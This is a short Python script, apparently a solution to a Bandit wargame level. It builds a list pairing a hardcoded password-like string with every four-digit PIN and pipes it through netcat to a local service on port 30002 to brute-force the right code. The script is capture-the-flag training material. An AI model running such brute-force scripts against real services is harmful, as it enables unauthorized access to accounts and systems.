import os

with open('bandit24.txt', 'w') as f:
	for i in range(0, 10000):
		s = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + str(i).zfill(4) + '\n'
		f.write(s)

os.system("nc localhost 30002 < bandit24.txt | grep -v Wrong!")